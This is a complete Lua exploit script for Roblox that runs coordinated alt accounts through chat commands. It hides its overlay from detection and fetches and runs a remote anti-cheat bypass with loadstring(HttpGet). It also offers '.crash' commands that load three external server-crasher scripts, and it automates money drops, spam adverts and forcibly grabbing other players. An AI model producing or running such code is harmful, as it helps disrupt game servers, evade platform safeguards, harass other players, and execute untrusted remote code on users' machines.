--#########################################################
--        Alt Control (All Features, No Workspace Instances)
--#########################################################
-- Features included:
--  • Admin/vault in bring + .setup
--  • Crash commands (.crash swag, .crash encrypt, .crash 15min)
--  • 15k drop (instead of 10k)
--  • .cdrop, .aura, .maskon/off, .wallet on/off, .ad on/off, etc.
--  • .setup (bank, admin, klub, vault, train)
--  • Sort all non-host players by UserId to get alt index => store in getgenv().PointInTable
--  • Minimal "render off" UI in CoreGui
--#########################################################

-- =============== GET USER SETTINGS ===============
local prefix    = getgenv().Prefix   or "."
local HostUser  = getgenv().HostUser or "HostNameHere"
local AdMessage = getgenv().AdMessage or "Default ad message"

local Players   = game:GetService("Players")
local RS        = game:GetService("RunService")
local RP        = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- =============== CHECK HOST vs ALT ===============
-- If we are the Host or have run before, do nothing
if LocalPlayer.Name == HostUser or getgenv().Executed then
    return
end
getgenv().Executed = true

-- =============== ALT INDEX BY SORTING ===============
-- Gather all players except the Host
local altList = {}
for _,plr in ipairs(Players:GetPlayers()) do
    if plr.Name ~= HostUser then
        table.insert(altList, plr)
    end
end

-- Sort by UserId ascending
table.sort(altList, function(a, b)
    return a.UserId < b.UserId
end)

-- Find local alt's position
local altIndex
for i,p in ipairs(altList) do
    if p == LocalPlayer then
        altIndex = i
        break
    end
end

if not altIndex then
    -- If for some reason we didn't find ourselves, stop.
    return
end

getgenv().PointInTable = altIndex
print(string.format("[ALT INDEX] %s is alt #%d", LocalPlayer.Name, altIndex))

-- =============== OPTIONAL RENDER/OFF SETTINGS ===============
UserSettings().GameSettings.MasterVolume = 0
RS:Set3dRenderingEnabled(false)
setfpscap(5)

-- Minimal “GUI overlay”
local mainGui = Instance.new("ScreenGui")
if syn and syn.protect_gui then
    -- If your exploit supports syn.protect_gui, do it to reduce chance of detection
    syn.protect_gui(mainGui)
end

local frame = Instance.new("Frame")
local label = Instance.new("TextLabel")

mainGui.Name = "RenderScreen_Alt"
mainGui.Parent = game.CoreGui  -- can also do nil parent if you prefer invisible

frame.Parent = mainGui
frame.Active = true
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.Position = UDim2.new(0.5, 0, 0.5, 0)
frame.Size = UDim2.new(1, 0, 1, 0)

label.Parent = frame
label.AnchorPoint = Vector2.new(0.5, 0.5)
label.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
label.BackgroundTransparency = 1.0
label.Position = UDim2.new(0.5, 0, 0.42, 0)
label.Size = UDim2.new(0, 279, 0, 34)
label.Font = Enum.Font.Gotham
label.Text = "ALT #" .. altIndex .. ": " .. LocalPlayer.Name
label.TextColor3 = Color3.fromRGB(255, 255, 255)
label.TextSize = 19

-- Wait for game to load
if not game:IsLoaded() then
    repeat task.wait() until game:IsLoaded()
end

-- Anti-AFK
local vu = game:GetService("VirtualUser")
LocalPlayer.Idled:Connect(function()
    vu:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
    task.wait(1)
    vu:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
end)

-- Optional anti-cheat bypass
pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/MsorkyScripts/OpenSourceAntiCheat/main/AntiCheatBypass.txt"))()
end)

--------------------------------------------------------------
--        BELOW: ALL THE FEATURES WITHOUT REMOVAL
--------------------------------------------------------------
local Crashed     = false
local CmdSettings = {}

--------------------------------------------------------------
-- ALREADY-EXISTING THINGS WE REFERENCE
--------------------------------------------------------------
local DropFolder = workspace:FindFirstChild("Ignored")
               and workspace.Ignored:FindFirstChild("Drop")

-- (If you used "game.Players.LocalPlayer" a lot, we can alias it as “Player”)
local Player = LocalPlayer

-- ============== MAIN COMMAND FUNCTIONS ==============
local function Drop(Type)
    if Type == true and not CmdSettings["Dropping"] then
        CmdSettings["Dropping"]   = true
        CmdSettings["CustomDrop"] = nil
        CmdSettings["Aura"]       = nil
        while CmdSettings["Dropping"] do
            RP.MainEvent:FireServer("DropMoney", "15000")  -- changed to 15k
            task.wait(2.5)
        end
    else
        CmdSettings["Dropping"]   = nil
        CmdSettings["CustomDrop"] = nil
    end
end

local function AirLock(Type)
    local char = Player.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end

    if Type and not CmdSettings["AirLock"] then
        CmdSettings["AirLock"] = true
        char.HumanoidRootPart.CFrame *= CFrame.new(0, 10, 0)
        local bp = Instance.new("BodyPosition")
        bp.Name = "AirLockBP"
        bp.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        bp.Position = char.HumanoidRootPart.Position
        bp.Parent   = char.HumanoidRootPart

    elseif not Type and CmdSettings["AirLock"] then
        CmdSettings["AirLock"] = nil
        local bp = char.HumanoidRootPart:FindFirstChild("AirLockBP")
        if bp then bp:Destroy() end
    end
end

local function GetPlayerFromString(str, ignoreLocal)
    local s = str:lower()
    for _,plr in pairs(Players:GetPlayers()) do
        if not ignoreLocal and plr==LocalPlayer then
            continue
        end
        if plr.Name:lower():sub(1,#s) == s or plr.DisplayName:lower():sub(1,#s) == s then
            return plr
        end
    end
    return nil
end

local function BringPlr(Target, POS)
    -- Original logic: only if alt #1 can bring
    if getgenv().PointInTable ~= 1 then
        return
    end
    local pChar = Player.Character
    if not (pChar and pChar:FindFirstChild("HumanoidRootPart") and pChar:FindFirstChild("Humanoid")) then return end
    local TargetChar = Target and Target.Character
    if not TargetChar or not TargetChar:FindFirstChild("HumanoidRootPart") then return end

    CmdSettings["Aura"] = nil

    local c = pChar
    local Root = c.HumanoidRootPart
    local tHum = TargetChar:FindFirstChild("Humanoid")

    if not tHum then return end
    if not c.BodyEffects or not c.BodyEffects:FindFirstChild("K.O") or not c.BodyEffects:FindFirstChild("Grabbed") then
        return
    end
    if c.BodyEffects["K.O"].Value or c.BodyEffects.Grabbed.Value~=nil then return end
    if not TargetChar:FindFirstChild("BodyEffects") or not TargetChar.BodyEffects:FindFirstChild("K.O") then return end
    if TargetChar.BodyEffects["K.O"].Value then return end

    CmdSettings["IsLocking"] = true
    c.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)

    Root.CFrame = TargetChar.HumanoidRootPart.CFrame*CFrame.new(0,0,1)
    repeat
        task.wait()
        Root.CFrame = TargetChar.HumanoidRootPart.CFrame*CFrame.new(0,0,1)
        if not c:FindFirstChild("Combat") and Player.Backpack:FindFirstChild("Combat") then
            c.Humanoid:EquipTool(Player.Backpack.Combat)
        end
        if c:FindFirstChild("Combat") then
            c.Combat:Activate()
        end
    until not Target or not TargetChar or not c
          or not c:FindFirstChild("BodyEffects")
          or c.BodyEffects["K.O"].Value
          or c.BodyEffects.Grabbed.Value~=nil
          or TargetChar.BodyEffects["K.O"].Value

    if c and Root and TargetChar:FindFirstChild("LowerTorso") then
        Root.CFrame = TargetChar.LowerTorso.CFrame*CFrame.new(0,3,0)
    end
    if c.BodyEffects.Grabbed.Value==nil then
        RP.MainEvent:FireServer("Grabbing", false)
    end
    task.wait(1.5)

    if not POS then
        -- If no POS given, assume bring to Host
        local hostPlr = Players:FindFirstChild( getgenv().HostUser )
        if hostPlr and hostPlr.Character and hostPlr.Character:FindFirstChild("HumanoidRootPart") then
            Root.CFrame = hostPlr.Character.HumanoidRootPart.CFrame
        end
    else
        Root.CFrame = POS
    end

    CmdSettings["IsLocking"] = nil
    task.wait(1.5)
    RP.MainEvent:FireServer("Grabbing", false)
end

-- BringLocations includes admin, vault, bank, klub, train
local BringLocations = {
    ["bank"]  = CFrame.new(-396.988922, 21.7570763, -293.929779, 
                           -0.102468058, -1.9584887e-09, -0.994736314, 
                            7.23731564e-09, 1, -2.71436984e-09, 
                            0.994736314, -7.47735651e-09, -0.102468058),
    ["admin"] = CFrame.new(-872.453674, -32.6421318, -532.476379, 
                            0.999682248, -1.36019978e-08, 0.0252073351, 
                            1.33811247e-08, 1, 8.93094043e-09, 
                            -0.0252073351, -8.59080007e-09, 0.999682248),
    ["klub"]  = CFrame.new(-264.434479, 0.0355005264, -430.854736, 
                           -0.999828756, 9.58909574e-09, -0.0185054261, 
                            9.92017934e-09, 1, -1.77993904e-08, 
                            0.0185054261, -1.79799198e-08, -0.999828756),
    ["vault"] = CFrame.new(-495.485901, 23.1428547, -284.661713, 
                           -0.0313318223, -4.10440322e-08, 0.999509037, 
                            2.18453966e-08, 1, 4.17489829e-08, 
                           -0.999509037, 2.31427428e-08, -0.0313318223),
    ["train"] = CFrame.new(591.396118, 34.5070686, -146.159561, 
                            0.0698467195, -4.91725913e-08, -0.997557759, 
                            5.03374231e-08, 1, -4.57684664e-08, 
                            0.997557759, -4.70177071e-08, 0.0698467195),	
}

-- .setup <bank/admin/klub/vault/train>
local SetupsTable = {
    Bank = {
        Origin      = CFrame.new(-386.826202, 21.2503242, -325.340912, 
                                 0.998742342, 0, -0.0501373149, 
                                 0, 1, 0, 
                                 0.0501373149, 0, 0.998742342)*CFrame.new(0,0,-3),
        ZMultiplier = 3,
        XMultiplier = 8,
        PerRow      = 10,
        Rows        = 4,
    },
    Admin = {
        Origin      = CFrame.new(-884.12915, -38.3972931, -545.291809, 
                                 -0.99998939, 2.69316498e-08, -0.00460755778, 
                                  2.6944301e-08, 1, -2.68358624e-09, 
                                  0.00460755778, -2.80770518e-09, -0.99998939),
        ZMultiplier = 3,
        XMultiplier = 8,
        PerRow      = 10,
        Rows        = 4,
    },
    Klub = {
        Origin      = CFrame.new(-237.016571, -4.87585974, -411.940063,
                                 0.994918466, -1.5840282e-08, -0.100683607, 
                                 6.8329018e-09, 1, -8.9807088e-08, 
                                 0.100683607, 8.86627731e-08, 0.994918466),
        ZMultiplier = 6,
        XMultiplier = -12,
        PerRow      = 10,
        Rows        = 4,
    },
    Vault = {
        Origin      = CFrame.new(-519.201355, 23.1994667, -292.362,
                                 -0.0597927198, 6.70288927e-08, -0.998210788, 
                                  2.96872589e-08, 1, 6.53707701e-08, 
                                  0.998210788, -2.57254467e-08, -0.0597927198),
        ZMultiplier = -2.5,
        XMultiplier = 4,
        PerRow      = 10,
        Rows        = 4,
    },
    Train = {
        Origin      = CFrame.new(606.527588, 34.5070801, -159.083542, 
                                 0.0376962014, -7.60452892e-08, 0.999289274, 
                                 6.54496404e-08, 1, 7.36304173e-08, 
                                 -0.999289274, 6.26275352e-08, 0.0376962014),
        ZMultiplier = 5,
        XMultiplier = -7,
        PerRow      = 10,
        Rows        = 4,
    }
}

local function Setup(Type)
    CmdSettings["Aura"] = nil
    local Table = SetupsTable[Type]
    if not Table then return end

    local char = Player.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return end

    local pIndex = getgenv().PointInTable
    local i

    if pIndex <= 10 then
        i = 1
    elseif pIndex <= 20 then
        i = 2
    elseif pIndex <= 30 then
        i = 3
    elseif pIndex <= 40 then
        i = 4
    end

    local XAxis, ZAxis = 0,0
    if i==1 then
        if pIndex <= Table.PerRow then
            XAxis = 0
            if pIndex == 1 then
                ZAxis = 0
            else
                ZAxis = (pIndex-1)*Table.ZMultiplier
            end
        end
    else
        local index = i*Table.PerRow
        if index>=pIndex then
            XAxis = (i-1)*Table.XMultiplier
            ZAxis = (i*Table.PerRow - pIndex)*Table.ZMultiplier
        end
    end

    root.CFrame = Table.Origin * CFrame.new(XAxis,0,ZAxis)
end

local function ShowWallet()
    local c = Player.Character
    if Player.Backpack:FindFirstChild("Wallet") then
        c.Humanoid:EquipTool(Player.Backpack.Wallet)
    end
end

local function RemoveWallet()
    local c = Player.Character
    if c:FindFirstChild("Wallet") then
        c.Humanoid:UnequipTools()
    end
end

local CurrAnim
local AbbreviationOptions = {
    ["k"] = 1000,
    ["m"] = 1000000
}

local function GetNumberFromText(str)
    str = str:lower()
    if str:find("k") then
        local newStr = str:gsub("k", "")
        return tonumber(newStr) and tonumber(newStr)*AbbreviationOptions["k"]
    elseif str:find("m") then
        local newStr = str:gsub("m", "")
        return tonumber(newStr) and tonumber(newStr)*AbbreviationOptions["m"]
    end
    return tonumber(str)
end

---------------------------------------------
--  CRASH Commands from your older versions
---------------------------------------------
-- We keep them all: .crash swag, .crash encrypt, .crash 15min
-- The code loads external raw scripts, so if that triggers anti-exploit, 
-- you might still get kicked in some games. But we've left them intact 
-- to preserve "no features removed."

-- Script references from your older code:
local function CrashSwag()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
end

local function CrashEncrypt()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/remorseW/encryptW/main/CustomEncryptCrasher.lua"))()
end

local function Crash15Min()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/remorseW/encryptW/main/DahooSuperQuickCrash.lua"))()
end

-- Helper to finalize crash:
local function FinalizeCrash()
    if game.CoreGui:FindFirstChild("RenderScreen_Alt") then
        game.CoreGui.RenderScreen_Alt:Destroy()
    end
    RS:Set3dRenderingEnabled(true)
    Crashed = true
    setfpscap(60)
    task.wait(1)
    setfpscap(60)
    task.wait(1)
    setfpscap(60)
    task.wait(1)
    setfpscap(60)
end

---------------------------------------------
-- Start Chat Command Listener
---------------------------------------------
local function Initiate()
    local conn
    conn = RP.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(data)
        local Message = data.Message
        local plrName = data.FromSpeaker
        if plrName ~= HostUser then
            return
        end

        -- If alt is crashed or missing a character, do nothing
        if Crashed or not Player.Character or not Player.Character:FindFirstChild("HumanoidRootPart") or not Player.Character:FindFirstChild("Humanoid") then
            return
        end
        if Player.Character.Humanoid.Health <= 0 then
            return
        end

        local lowerMsg = Message:lower()
        local Args = lowerMsg:split(" ")

        -- .drop
        if Args[1] == prefix.."drop" then
            Drop(true)

        -- .stopdrop
        elseif Args[1] == prefix.."stopdrop" then
            Drop(false)

        -- .ad on/off
        elseif Args[1] == prefix.."ad" and Args[2] == "on" then
            if not CmdSettings["AdOn"] then
                local newStr = Message:gsub(prefix.."ad on", "")
                if #newStr:gsub("%s+","")<1 then
                    newStr = AdMessage
                end
                CmdSettings["AdOn"] = true
                coroutine.wrap(function()
                    while CmdSettings["AdOn"] do
                        RP.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(newStr, 'All')
                        task.wait(1.5)
                    end
                end)()
            end

        elseif lowerMsg == prefix.."ad off" then
            CmdSettings["AdOn"] = nil

        -- .loopdel
        elseif lowerMsg == prefix.."loopdel" then
            if DropFolder then
                DropFolder:Destroy()
                DropFolder = nil
            end

        -- .circle host
        elseif lowerMsg == prefix.."circle host" then
            local hostPlr = Players:FindFirstChild(HostUser)
            if hostPlr and hostPlr.Character and hostPlr.Character:FindFirstChild("HumanoidRootPart") then
                local angle = 0
                local cfr = hostPlr.Character.HumanoidRootPart.CFrame*CFrame.new(0,1,0)
                local altN = getgenv().PointInTable
                local size = 3

                local ZAxis = 2
                if altN <= 10 then
                    angle = (10 - altN)
                    ZAxis = 2
                elseif altN <= 20 then
                    angle = (20 - altN)
                    ZAxis = -1
                elseif altN <= 30 then
                    angle = (30 - altN)
                    ZAxis = -4
                elseif altN <= 40 then
                    angle = (40 - altN)
                    ZAxis = -8
                end
                angle = angle * 36

                local c = Player.Character
                local r = c and c:FindFirstChild("HumanoidRootPart")
                if r then
                    r.CFrame = cfr*CFrame.fromEulerAnglesXYZ(0, math.rad(angle), 0)*CFrame.new(0,-size,-10)
                    r.CFrame = r.CFrame*CFrame.new(0,0,2)
                    r.CFrame = r.CFrame*CFrame.Angles(0, math.rad(180), 0)
                end
            end

        -- Crash Commands
        elseif Args[1] == prefix.."crash" and not Crashed then
            local method = Args[2]
            local userStr = Args[3] or ""
            local targetPlr = GetPlayerFromString(userStr, true)
            if targetPlr == Player then
                -- `.crash swag`
                if method=="swag" then
                    FinalizeCrash()
                    CrashSwag()

                -- `.crash encrypt`
                elseif method=="encrypt" then
                    FinalizeCrash()
                    CrashEncrypt()

                -- `.crash 15min`
                elseif method=="15min" then
                    FinalizeCrash()
                    Crash15Min()
                end
            end

        -- .reset
        elseif Args[1] == prefix.."reset" then
            local char = Player.Character
            if char then
                local FLC = char:FindFirstChild("FULLY_LOADED_CHAR")
                if FLC then
                    FLC.Parent = RP
                    FLC:Destroy()
                end
                char:Destroy()
            end

        -- .airlock / .stopairlock
        elseif Args[1] == prefix.."airlock" then
            AirLock(true)
        elseif Args[1] == prefix.."stopairlock" then
            AirLock(false)

        -- .bring
        elseif lowerMsg == prefix.."bring" then
            local hostPlr = Players:FindFirstChild(HostUser)
            if hostPlr and hostPlr.Character and hostPlr.Character:FindFirstChild("HumanoidRootPart") then
                Player.Character.HumanoidRootPart.CFrame = hostPlr.Character.HumanoidRootPart.CFrame*CFrame.new(0,0,-1)
            end

        -- .bring <player> <loc> or .bring host <loc>
        elseif Args[1] == prefix.."bring" and #Args>=3 then
            local p2 = Args[2]
            local p3 = Args[3]
            local foundPlr = GetPlayerFromString(p2)
            if p2=="host" and BringLocations[p3:lower()] then
                local hostP = Players:FindFirstChild(HostUser)
                if hostP then
                    BringPlr(hostP, BringLocations[p3:lower()])
                end
            elseif foundPlr and BringLocations[p3:lower()] then
                BringPlr(foundPlr, BringLocations[p3:lower()])
            elseif foundPlr and p3=="host" then
                BringPlr(foundPlr, nil)
            end

        -- .setup <bank/admin/klub/vault/train>
        elseif Args[1] == prefix.."setup" and Args[2] then
            local locKey = Args[2]:gsub("^%l", string.upper)  -- e.g. "bank"->"Bank"
            Setup(locKey)

        -- .wallet on/off
        elseif lowerMsg == prefix.."wallet on" then
            ShowWallet()
        elseif lowerMsg == prefix.."wallet off" then
            RemoveWallet()

        -- .dolphin / .monkey / .floss / .shuffle / .stopdance
        elseif lowerMsg == prefix.."dolphin" then
            if CurrAnim and CurrAnim.IsPlaying then CurrAnim:Stop() end
            local anim=Instance.new("Animation")
            anim.AnimationId="http://www.roblox.com/asset/?id=5918726674"
            CurrAnim = Player.Character.Humanoid.Animator:LoadAnimation(anim)
            CurrAnim:Play()

        elseif lowerMsg == prefix.."monkey" then
            if CurrAnim and CurrAnim.IsPlaying then CurrAnim:Stop() end
            local anim=Instance.new("Animation")
            anim.AnimationId="http://www.roblox.com/asset/?id=3333499508"
            CurrAnim = Player.Character.Humanoid.Animator:LoadAnimation(anim)
            CurrAnim:Play()

        elseif lowerMsg == prefix.."floss" then
            if CurrAnim and CurrAnim.IsPlaying then CurrAnim:Stop() end
            local anim=Instance.new("Animation")
            anim.AnimationId="http://www.roblox.com/asset/?id=5917459365"
            CurrAnim = Player.Character.Humanoid.Animator:LoadAnimation(anim)
            CurrAnim:Play()

        elseif lowerMsg == prefix.."shuffle" then
            if CurrAnim and CurrAnim.IsPlaying then CurrAnim:Stop() end
            local anim=Instance.new("Animation")
            anim.AnimationId="http://www.roblox.com/asset/?id=4349242221"
            CurrAnim = Player.Character.Humanoid.Animator:LoadAnimation(anim)
            CurrAnim:Play()

        elseif lowerMsg == prefix.."stopdance" then
            if CurrAnim and CurrAnim.IsPlaying then
                CurrAnim:Stop()
            end

        -- .maskon / .maskoff
        elseif lowerMsg == prefix.."maskon" then
            local c = Player.Character
            if not c or not c:FindFirstChild("HumanoidRootPart") then return end
            local maskItem = workspace.Ignored.Shop:FindFirstChild("[Surgeon Mask] - $25")
            if maskItem and maskItem:FindFirstChild("ClickDetector") then
                local tries=0
                repeat
                    task.wait(0.1)
                    tries+=1
                    c.HumanoidRootPart.CFrame = maskItem.Head.CFrame*CFrame.new(math.random(-1,1),0,math.random(-1,1))
                    fireclickdetector(maskItem.ClickDetector)
                until tries>=50 or not c or not c:FindFirstChild("Humanoid") 
                      or c:FindFirstChild("Mask") or Player.Backpack:FindFirstChild("Mask")
            end
            task.wait(0.5)
            if Player.Backpack:FindFirstChild("Mask") then
                c.Humanoid:EquipTool(Player.Backpack.Mask)
                c.Mask:Activate()
            elseif c:FindFirstChild("Mask") then
                c.Mask:Activate()
            end

        elseif lowerMsg == prefix.."maskoff" then
            local c = Player.Character
            if Player.Backpack:FindFirstChild("Mask") then
                c.Humanoid:EquipTool(Player.Backpack.Mask)
                c.Mask:Activate()
            elseif c:FindFirstChild("Mask") then
                c.Mask:Activate()
            end

        -- .aura <username>
        elseif Args[1] == prefix.."aura" and Args[2] then
            local p = GetPlayerFromString(Args[2], true)
            if p==Player and not CmdSettings["Aura"] then
                CmdSettings["Aura"]     = true
                CmdSettings["Dropping"] = nil
                CmdSettings["CustomDrop"]= nil

                coroutine.wrap(function()
                    while CmdSettings["Aura"] do
                        if DropFolder and Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
                            for _,v in pairs(DropFolder:GetChildren()) do
                                if v:IsA("BasePart") and v.Name=="MoneyDrop" then
                                    local dist=(v.Position-Player.Character.HumanoidRootPart.Position).Magnitude
                                    if dist<=12 then
                                        fireclickdetector(v.ClickDetector)
                                        task.wait(0.2)
                                    end
                                end
                            end
                        end
                        task.wait()
                    end
                end)()
            end

        elseif Args[1] == prefix.."stopaura" then
            CmdSettings["Aura"] = nil

        -- .cdrop <amount>
        elseif Args[1] == prefix.."cdrop" and Args[2] and not CmdSettings["CustomDrop"] then
            local Number = GetNumberFromText(Args[2])
            if Number and DropFolder then
                CmdSettings["Aura"]     = nil
                CmdSettings["Dropping"] = nil

                local OldMoney=0
                for _,v in pairs(DropFolder:GetChildren()) do
                    if v.Name=="MoneyDrop" and v:FindFirstChild("BillboardGui") then
                        local text = v.BillboardGui.TextLabel.Text
                        local amt = tonumber(text:gsub("%D",""))
                        if amt then
                            OldMoney+=amt
                        end
                    end
                end

                -- initiate first
                RP.MainEvent:FireServer("DropMoney", 15000)
                CmdSettings["CustomDrop"] = true

                coroutine.wrap(function()
                    repeat
                        task.wait(2.5)
                        RP.MainEvent:FireServer("DropMoney", 15000)
                        local Money=0
                        for _,obj in pairs(DropFolder:GetChildren()) do
                            if obj.Name=="MoneyDrop" and obj:FindFirstChild("BillboardGui") then
                                local t = obj.BillboardGui.TextLabel.Text
                                local val = tonumber(t:gsub("%D",""))
                                if val then
                                    Money+=val
                                end
                            end
                        end
                    until not DropFolder
                          or Money>=(OldMoney+Number)
                          or not CmdSettings["CustomDrop"]

                    if CmdSettings["CustomDrop"] then
                        CmdSettings["CustomDrop"] = nil
                        RP.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('Custom Drop has finished.', 'All')
                    end
                end)()
            end
        end
    end)
end

Initiate()
